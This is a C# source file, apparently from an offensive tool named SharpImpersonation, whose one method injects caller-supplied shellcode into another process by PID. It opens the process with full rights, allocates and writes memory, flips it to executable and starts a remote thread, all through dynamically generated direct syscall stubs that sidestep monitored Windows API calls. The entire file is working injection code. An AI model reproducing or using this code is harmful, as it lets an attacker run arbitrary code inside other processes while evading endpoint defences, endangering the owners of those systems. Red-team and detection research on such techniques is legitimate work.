using System;
using System.Runtime.InteropServices;

namespace SharpImpersonation
{

    class Shellcode
    {

        public static void SyscallCreateRemoteThread(byte[] shellcodebytes, int PID)
        {
            int ProcID = PID;

            var shellcode = shellcodebytes;

            // NtOpenProcess
            IntPtr stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcess");
            NtOpenProcess OpenProc = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)(ProcID)
            };

            InvokeItDynamically.Native.NTSTATUS statusresult;

            statusresult = OpenProc(
                ref hProcess,
                            0x001F0FFF,
                ref oa,
                ref ci);

            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtOpenProcess Success!");
            }
            else
            {
                Console.WriteLine("[-] NtOpenProcess failed - error code: " + statusresult);
            }
            // NtAllocateVirtualMemory
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory AllocateMem = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcodebytes.Length;

            statusresult = AllocateMem(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                            0x1000 | 0x2000,
                            0x04);

            if (statusresult == 0)
            {
                Console.WriteLine("[+] NtAllocateVirtualMemory Success!");
            }
            else
            {
                Console.WriteLine("[-] NtAllocateVirtualMemory failed - error code: " + statusresult);
            }
            // NtWriteVirtualMemory
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory WriteMem = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcodebytes.Length);
            Marshal.Copy(shellcodebytes, 0, buffer, shellcodebytes.Length);

            uint bytesWritten = 0;

            statusresult = WriteMem(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcodebytes.Length,
                ref bytesWritten);

            if (statusresult == 0)
            {
                Console.WriteLine("[+] NtWriteVirtualMemory Success!");
            }
            else
            {
                Console.WriteLine("[-] NtWriteVirtualMemory failed - error code: " + statusresult);
            }

            // NtProtectVirtualMemory
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory ProtectMem = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            uint oldProtect = 0;

            statusresult = ProtectMem(
                hProcess,
                ref baseAddress,
                ref regionSize,
                            0x20,
                ref oldProtect);

            if (statusresult == 0)
            {
                Console.WriteLine("[+] NtProtectVirtualMemory Success!");
            }
            else
            {
                Console.WriteLine("[-] NtProtectVirtualMemory failed - error code: " + statusresult);
            }

            // NtCreateThreadEx
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx CreateThread = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            statusresult = CreateThread(
                out hThread,
                InvokeItDynamically.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                            false,
                            0,
                            0,
                            0,
                IntPtr.Zero);

            if (statusresult == 0)
            {
                Console.WriteLine("[+] NtCreateThreadEx Success!");
            }
            else
            {
                Console.WriteLine("[-] NtCreateThreadEx failed - error code: " + statusresult);
            }
        }

    }
}
